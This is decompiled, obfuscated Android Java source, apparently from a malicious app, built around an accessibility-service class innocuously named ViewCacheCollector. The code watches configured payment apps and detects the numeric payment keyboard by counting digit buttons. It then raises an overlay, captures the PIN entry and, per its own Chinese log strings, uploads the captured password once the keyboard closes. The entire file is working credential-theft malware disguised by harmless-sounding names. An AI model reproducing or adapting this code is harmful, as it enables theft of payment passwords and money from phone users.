package com.storm.safe.rock.service.modules.cipher;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.storm.safe.rock.service.modules.cipher.C0341a7;
import com.storm.safe.rock.util.StringUtil;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import kotlin.AbstractC0767a0;
import kotlin.text.AbstractC0779a1;
import org.json.JSONArray;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC0134bh;
import p000.AbstractC0715je;
import p000.AbstractC0717jg;
import p000.AbstractC0721jk;
import p000.RunnableC0029ai;
import p000.RunnableC1053p2;
import p000.aa1;
import p000.h10;
import p000.m21;
import p000.t60;
import p000.w00;
import p000.y90;
import p000.z91;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.cipher.a7 */
/* loaded from: classes2.dex */
public final class C0341a7 {

    /* renamed from: c2 */
    public static volatile C0341a7 f53381c2;

    /* renamed from: a0 */
    public volatile AccessibilityService f53383a0;

    /* renamed from: a1 */
    public final Context f53384a1;

    /* renamed from: a6 */
    public String f53389a6;

    /* renamed from: b0 */
    public h10 f53393b0;

    /* renamed from: b4 */
    public final z91 f53397b4;

    /* renamed from: b5 */
    public volatile boolean f53398b5;

    /* renamed from: b6 */
    public h10 f53399b6;

    /* renamed from: b7 */
    public volatile aa1 f53400b7;

    /* renamed from: c0 */
    public final z91 f53403c0;

    /* renamed from: c1 */
    public static final C0340a6 f53380c1 = new C0340a6(null);

    /* renamed from: c3 */
    public static final Set f53382c3 = AbstractC0134bh.m210734f7(new String[]{"android", "com.android.systemui", "com.android.providers.telephony", "com.android.providers.media", "com.android.providers.settings", "com.android.launcher", "com.android.launcher3", "com.google.android.apps.nexuslauncher", "com.miui.home", "com.huawei.android.launcher", "com.hihonor.android.launcher", StringUtil.m212470a0("KFYcdEIoHCEZPSpMHzlFPR4="), StringUtil.m212470a0("KFYcdE43ACFFPjgXAjtLPQ8rWSUuSw=="), StringUtil.m212470a0("KFYcdFsxGiEZPSpMHzlFPR4="), "com.bbk.launcher2", "com.sec.android.app.launcher", "com.samsung.android.incallui", "com.oneplus.launcher", "com.nothing.launcher", "com.realme.launcher", "com.transsion.hilauncher", "com.android.incallui", "com.android.phone", "com.google.android.gms", "com.google.android.packageinstaller", "com.android.packageinstaller"});

    /* renamed from: a2 */
    public final CopyOnWriteArrayList f53385a2 = new CopyOnWriteArrayList();

    /* renamed from: a3 */
    public final AtomicReference f53386a3 = new AtomicReference(null);

    /* renamed from: a4 */
    public final AtomicReference f53387a4 = new AtomicReference(null);

    /* renamed from: a5 */
    public final AtomicBoolean f53388a5 = new AtomicBoolean(false);

    /* renamed from: a7 */
    public volatile String f53390a7 = "";

    /* renamed from: a8 */
    public volatile String f53391a8 = "";

    /* renamed from: a9 */
    public volatile String f53392a9 = "";

    /* renamed from: b1 */
    public final Handler f53394b1 = new Handler(Looper.getMainLooper());

    /* renamed from: b2 */
    public final y90 f53395b2 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.cipher.ViewCacheCollector$prefs$2
        {
            super(0);
        }

        @Override // p000.w00
        public final Object invoke() {
            return this.f53279a0.f53384a1.getSharedPreferences("vc_cache", 0);
        }
    });

    /* renamed from: b3 */
    public final AtomicBoolean f53396b3 = new AtomicBoolean(false);

    /* renamed from: b8 */
    public volatile String f53401b8 = "";

    /* renamed from: b9 */
    public volatile String f53402b9 = "";

    /* JADX WARN: Type inference failed for: r3v6, types: [z91] */
    /* JADX WARN: Type inference failed for: r4v3, types: [z91] */
    public C0341a7(AccessibilityService accessibilityService, Context context) {
        this.f53383a0 = accessibilityService;
        this.f53384a1 = context;
        final int i = 0;
        this.f53397b4 = new Runnable(this) { // from class: z91

            /* renamed from: a1 */
            public final /* synthetic */ C0341a7 f61471a1;

            {
                this.f61471a1 = this;
            }

            @Override // java.lang.Runnable
            public final void run() {
                aa1 aa1Var;
                switch (i) {
                    case 0:
                        C0341a7 c0341a7 = this.f61471a1;
                        c0341a7.f53396b3.set(false);
                        if (!c0341a7.f53388a5.get() && (aa1Var = c0341a7.f53400b7) != null) {
                            String str = c0341a7.f53401b8;
                            String str2 = c0341a7.f53402b9;
                            if (!c0341a7.m211865a4()) {
                                t60.m214702c3("VCC", "未发现支付键盘: pkg=" + str + ", cls=" + str2);
                                c0341a7.f53394b1.postDelayed(new e41(c0341a7, str, aa1Var, str2, 1), 800L);
                                break;
                            } else {
                                t60.m214714d6("VCC", AbstractC0003a2.m34b5("🎯 UI 探测发现支付键盘！pkg=", str, ", cls=", str2, " → 启动遮罩"));
                                c0341a7.f53387a4.set(aa1Var.f58a2);
                                c0341a7.m211870b0(str, str2);
                                break;
                            }
                        }
                        break;
                    default:
                        C0341a7 c0341a72 = this.f61471a1;
                        if (c0341a72.f53388a5.get()) {
                            if (!c0341a72.m211865a4()) {
                                t60.m214714d6("VCC", "🏁 键盘已消失，密码输入完成 → 上传并移除遮罩");
                                c0341a72.m211871b1();
                                break;
                            } else {
                                t60.m214702c3("VCC", "键盘仍在，继续捕获");
                                break;
                            }
                        }
                        break;
                }
            }
        };
        final int i2 = 1;
        this.f53403c0 = new Runnable(this) { // from class: z91

            /* renamed from: a1 */
            public final /* synthetic */ C0341a7 f61471a1;

            {
                this.f61471a1 = this;
            }

            @Override // java.lang.Runnable
            public final void run() {
                aa1 aa1Var;
                switch (i2) {
                    case 0:
                        C0341a7 c0341a7 = this.f61471a1;
                        c0341a7.f53396b3.set(false);
                        if (!c0341a7.f53388a5.get() && (aa1Var = c0341a7.f53400b7) != null) {
                            String str = c0341a7.f53401b8;
                            String str2 = c0341a7.f53402b9;
                            if (!c0341a7.m211865a4()) {
                                t60.m214702c3("VCC", "未发现支付键盘: pkg=" + str + ", cls=" + str2);
                                c0341a7.f53394b1.postDelayed(new e41(c0341a7, str, aa1Var, str2, 1), 800L);
                                break;
                            } else {
                                t60.m214714d6("VCC", AbstractC0003a2.m34b5("🎯 UI 探测发现支付键盘！pkg=", str, ", cls=", str2, " → 启动遮罩"));
                                c0341a7.f53387a4.set(aa1Var.f58a2);
                                c0341a7.m211870b0(str, str2);
                                break;
                            }
                        }
                        break;
                    default:
                        C0341a7 c0341a72 = this.f61471a1;
                        if (c0341a72.f53388a5.get()) {
                            if (!c0341a72.m211865a4()) {
                                t60.m214714d6("VCC", "🏁 键盘已消失，密码输入完成 → 上传并移除遮罩");
                                c0341a72.m211871b1();
                                break;
                            } else {
                                t60.m214702c3("VCC", "键盘仍在，继续捕获");
                                break;
                            }
                        }
                        break;
                }
            }
        };
    }

    /* renamed from: a6 */
    public static void m211860a6(AccessibilityNodeInfo accessibilityNodeInfo, LinkedHashSet linkedHashSet) {
        Character chM213936e4;
        try {
            if (accessibilityNodeInfo.isVisibleToUser()) {
                CharSequence text = accessibilityNodeInfo.getText();
                String string = null;
                String string2 = text != null ? text.toString() : null;
                CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                String string3 = contentDescription != null ? contentDescription.toString() : null;
                String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
                if (viewIdResourceName == null) {
                    viewIdResourceName = "";
                }
                if (string2 != null && AbstractC0779a1.m213687e0(string2).toString().length() == 1 && Character.isDigit(AbstractC0779a1.m213687e0(string2).toString().charAt(0))) {
                    string = AbstractC0779a1.m213687e0(string2).toString();
                } else if (string3 != null && AbstractC0779a1.m213687e0(string3).toString().length() == 1 && Character.isDigit(AbstractC0779a1.m213687e0(string3).toString().charAt(0))) {
                    string = AbstractC0779a1.m213687e0(string3).toString();
                } else if (AbstractC0779a1.m213652a5(viewIdResourceName, ":id/", false) && !AbstractC0779a1.m213652a5(viewIdResourceName, "delete", true) && !AbstractC0779a1.m213652a5(viewIdResourceName, "enter", true) && !AbstractC0779a1.m213652a5(viewIdResourceName, "cancel", true) && (chM213936e4 = m21.m213936e4(viewIdResourceName)) != null && Character.isDigit(chM213936e4.charValue())) {
                    string = chM213936e4.toString();
                }
                if (string != null) {
                    linkedHashSet.add(string);
                }
                int childCount = accessibilityNodeInfo.getChildCount();
                for (int i = 0; i < childCount; i++) {
                    AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                    if (child != null) {
                        m211860a6(child, linkedHashSet);
                    }
                }
            }
        } catch (Exception unused) {
        }
    }

    /* renamed from: a0 */
    public final void m211861a0(final String str, ArrayList arrayList, String str2) {
        h10 h10Var = new h10() { // from class: com.storm.safe.rock.service.modules.cipher.ViewCacheCollector$addRule$1
            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            {
                super(1);
            }

            @Override // p000.h10
            public final Object invoke(Object obj) {
                return Boolean.valueOf(t60.m214686a2(((aa1) obj).f56a0, str));
            }
        };
        CopyOnWriteArrayList copyOnWriteArrayList = this.f53385a2;
        AbstractC0721jk.m213316h4(copyOnWriteArrayList, h10Var);
        copyOnWriteArrayList.add(new aa1(str, arrayList, str2));
        StringBuilder sbM41c2 = AbstractC0003a2.m41c2("规则已添加: ", str, " (", str2, "), winClasses=");
        sbM41c2.append(arrayList);
        t60.m214714d6("VCC", sbM41c2.toString());
    }

    /* renamed from: a1 */
    public final ArrayList m211862a1() {
        CopyOnWriteArrayList copyOnWriteArrayList = this.f53385a2;
        ArrayList arrayList = new ArrayList(AbstractC0717jg.m213310g9(copyOnWriteArrayList));
        Iterator it = copyOnWriteArrayList.iterator();
        while (it.hasNext()) {
            arrayList.add(((aa1) it.next()).f56a0);
        }
        return arrayList;
    }

    /* renamed from: a2 */
    public final void m211863a2() {
        try {
            String string = this.f53384a1.getSharedPreferences("payment_strategies", 0).getString("strategies", null);
            if (string == null) {
                return;
            }
            JSONArray jSONArray = new JSONArray(string);
            int length = jSONArray.length();
            for (int i = 0; i < length; i++) {
                JSONObject jSONObject = jSONArray.getJSONObject(i);
                String strOptString = jSONObject.optString("packageName", "");
                String strOptString2 = jSONObject.optString("appName", "");
                JSONArray jSONArrayOptJSONArray = jSONObject.optJSONArray("listenWinClasses");
                ArrayList arrayList = new ArrayList();
                if (jSONArrayOptJSONArray != null) {
                    int length2 = jSONArrayOptJSONArray.length();
                    for (int i2 = 0; i2 < length2; i2++) {
                        String string2 = jSONArrayOptJSONArray.getString(i2);
                        t60.m214694b5(string2, "winClassesArr.getString(j)");
                        arrayList.add(string2);
                    }
                }
                t60.m214694b5(strOptString, "pkg");
                if (strOptString.length() > 0) {
                    t60.m214694b5(strOptString2, "appName");
                    m211861a0(strOptString, arrayList, strOptString2);
                }
            }
            t60.m214714d6("VCC", "✅ 已从本地加载 " + jSONArray.length() + " 条支付策略");
        } catch (Exception unused) {
        }
    }

    /* renamed from: a3 */
    public final void m211864a3(String str, String str2) {
        Object next;
        String str3;
        if (this.f53385a2.isEmpty()) {
            return;
        }
        Iterator it = this.f53385a2.iterator();
        while (true) {
            if (!it.hasNext()) {
                next = null;
                break;
            } else {
                next = it.next();
                if (((aa1) next).f56a0.equals(str)) {
                    break;
                }
            }
        }
        aa1 aa1Var = (aa1) next;
        if (aa1Var != null) {
            ArrayList arrayList = aa1Var.f57a1;
            StringBuilder sbM41c2 = AbstractC0003a2.m41c2("🔍 窗口变化: pkg=", str, ", cls=", str2, ", 规则winClasses=");
            sbM41c2.append(arrayList);
            t60.m214726f4("VCC", sbM41c2.toString());
        }
        if (aa1Var == null) {
            if (f53382c3.contains(str) || AbstractC0779a1.m213679d2(str, false, "com.android.providers.") || AbstractC0779a1.m213679d2(str, false, "com.android.internal.") || (str3 = (String) this.f53386a3.get()) == null || str.equals(this.f53384a1.getPackageName())) {
                return;
            }
            t60.m214714d6("VCC", AbstractC0003a2.m34b5("离开支付应用 (", str3, " -> ", str, ")，停止捕获并上传"));
            this.f53396b3.set(false);
            Handler handler = this.f53394b1;
            handler.removeCallbacks(this.f53397b4);
            handler.removeCallbacks(this.f53403c0);
            m211871b1();
            return;
        }
        if (aa1Var.f57a1.isEmpty()) {
            if (t60.m214686a2((String) this.f53386a3.get(), str)) {
                t60.m214702c3("VCC", AbstractC0003a2.m34b5("同包名内窗口切换 (", this.f53389a6, " -> ", str2, ")，检查键盘是否消失"));
                this.f53389a6 = str2;
                m211867a7();
                return;
            } else {
                if (this.f53388a5.get() || this.f53396b3.getAndSet(true)) {
                    return;
                }
                this.f53400b7 = aa1Var;
                this.f53401b8 = str;
                this.f53402b9 = str2;
                this.f53394b1.removeCallbacks(this.f53397b4);
                this.f53394b1.postDelayed(this.f53397b4, 500L);
                t60.m214702c3("VCC", "📋 已调度 UI 键盘探测 (500ms): pkg=" + str + ", cls=" + str2);
                return;
            }
        }
        ArrayList arrayList2 = aa1Var.f57a1;
        if (!arrayList2.isEmpty()) {
            int size = arrayList2.size();
            int i = 0;
            while (i < size) {
                Object obj = arrayList2.get(i);
                i++;
                String str4 = (String) obj;
                if (AbstractC0779a1.m213652a5(str2, str4, false) || str4.equals(str2)) {
                    this.f53396b3.set(false);
                    Handler handler2 = this.f53394b1;
                    handler2.removeCallbacks(this.f53397b4);
                    handler2.removeCallbacks(this.f53403c0);
                    String str5 = (String) this.f53386a3.get();
                    if (t60.m214686a2(str5, str) && t60.m214686a2(this.f53389a6, str2)) {
                        return;
                    }
                    String str6 = aa1Var.f58a2;
                    StringBuilder sbM41c22 = AbstractC0003a2.m41c2("✓ 规则命中: pkg=", str, ", cls=", str2, ", app=");
                    sbM41c22.append(str6);
                    t60.m214714d6("VCC", sbM41c22.toString());
                    if (t60.m214686a2(str5, str)) {
                        String str7 = this.f53389a6;
                        if (str7 != null && !str7.equals(str2)) {
                            t60.m214714d6("VCC", AbstractC0003a2.m34b5("同包名页面切换 (", this.f53389a6, " -> ", str2, ")，检查键盘是否消失"));
                            m211867a7();
                        }
                    } else {
                        if (str5 != null) {
                            m211871b1();
                        }
                        this.f53387a4.set(aa1Var.f58a2);
                        m211870b0(str, str2);
                    }
                    this.f53389a6 = str2;
                    return;
                }
            }
        }
        String str8 = (String) this.f53386a3.get();
        if (t60.m214686a2(str8, str) && this.f53388a5.get()) {
            t60.m214702c3("VCC", AbstractC0003a2.m34b5("同包名窗口切换到非支付页 (", this.f53389a6, " -> ", str2, ")，检查键盘是否消失"));
            this.f53389a6 = str2;
            m211867a7();
        } else if (t60.m214686a2(str8, str)) {
            this.f53389a6 = str2;
        }
    }

    /* renamed from: a4 */
    public final boolean m211865a4() {
        LinkedHashSet linkedHashSet;
        AccessibilityNodeInfo rootInActiveWindow;
        try {
            linkedHashSet = new LinkedHashSet();
            List<AccessibilityWindowInfo> windows = this.f53383a0.getWindows();
            if (windows != null) {
                Iterator<AccessibilityWindowInfo> it = windows.iterator();
                while (it.hasNext()) {
                    AccessibilityNodeInfo root = it.next().getRoot();
                    if (root != null) {
                        m211860a6(root, linkedHashSet);
                        if (linkedHashSet.size() >= 10) {
                            break;
                        }
                    }
                }
            }
            if (linkedHashSet.size() < 10 && (rootInActiveWindow = this.f53383a0.getRootInActiveWindow()) != null) {
                m211860a6(rootInActiveWindow, linkedHashSet);
            }
            t60.m214702c3("VCC", "键盘探测: 找到 " + linkedHashSet.size() + " 个数字按钮 (" + AbstractC0715je.m213299i6(linkedHashSet) + ")");
        } catch (Exception unused) {
        }
        return linkedHashSet.size() >= 10;
    }

    /* renamed from: a5 */
    public final void m211866a5(final String str) {
        AbstractC0721jk.m213316h4(this.f53385a2, new h10() { // from class: com.storm.safe.rock.service.modules.cipher.ViewCacheCollector$removeRule$1
            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            {
                super(1);
            }

            @Override // p000.h10
            public final Object invoke(Object obj) {
                return Boolean.valueOf(t60.m214686a2(((aa1) obj).f56a0, str));
            }
        });
        if (t60.m214686a2(this.f53386a3.get(), str)) {
            m211872b2();
        }
    }

    /* renamed from: a7 */
    public final void m211867a7() {
        if (this.f53388a5.get()) {
            Handler handler = this.f53394b1;
            z91 z91Var = this.f53403c0;
            handler.removeCallbacks(z91Var);
            handler.postDelayed(z91Var, 500L);
        }
    }

    /* renamed from: a8 */
    public final void m211868a8(boolean z) {
        if (this.f53398b5 != z) {
            this.f53398b5 = z;
            h10 h10Var = this.f53399b6;
            if (h10Var != null) {
                h10Var.invoke(Boolean.valueOf(z));
            }
            t60.m214702c3("VCC", "支付模式: " + z);
        }
    }

    /* renamed from: a9 */
    public final void m211869a9(ArrayList arrayList) {
        CopyOnWriteArrayList copyOnWriteArrayList = this.f53385a2;
        copyOnWriteArrayList.clear();
        copyOnWriteArrayList.addAll(arrayList);
        ArrayList arrayList2 = new ArrayList(AbstractC0717jg.m213310g9(copyOnWriteArrayList));
        Iterator it = copyOnWriteArrayList.iterator();
        while (it.hasNext()) {
            aa1 aa1Var = (aa1) it.next();
            arrayList2.add(aa1Var.f56a0 + "(" + aa1Var.f57a1.size() + "cls)");
        }
        t60.m214714d6("VCC", "规则已设置: " + arrayList2);
    }

    /* renamed from: b0 */
    public final void m211870b0(String str, String str2) {
        t60.m214714d6("VCC", "▶ 启动overlay: pkg=" + str + ", cls=" + str2);
        this.f53386a3.set(str);
        this.f53388a5.set(true);
        this.f53389a6 = str2;
        m211868a8(true);
        ListenHelper listenHelper = new ListenHelper();
        listenHelper.f53239a0 = 0;
        this.f53394b1.post(new RunnableC0029ai(this, listenHelper, str));
    }

    /* renamed from: b1 */
    public final void m211871b1() {
        if (this.f53388a5.get()) {
            t60.m214714d6("VCC", "⏹ 停止并上传");
            this.f53388a5.set(false);
            String str = (String) this.f53386a3.get();
            if (str == null) {
                str = "";
            }
            this.f53390a7 = str;
            String str2 = (String) this.f53387a4.get();
            if (str2 == null) {
                str2 = "";
            }
            this.f53391a8 = str2;
            String str3 = this.f53389a6;
            this.f53392a9 = str3 != null ? str3 : "";
            this.f53394b1.post(new RunnableC1053p2(6));
        }
        this.f53386a3.set(null);
        this.f53387a4.set(null);
        this.f53389a6 = null;
        m211868a8(false);
    }

    /* renamed from: b2 */
    public final void m211872b2() {
        t60.m214714d6("VCC", "🔴 停止捕获");
        this.f53388a5.set(false);
        this.f53386a3.set(null);
        this.f53387a4.set(null);
        m211868a8(false);
        this.f53394b1.post(new RunnableC1053p2(7));
    }
}
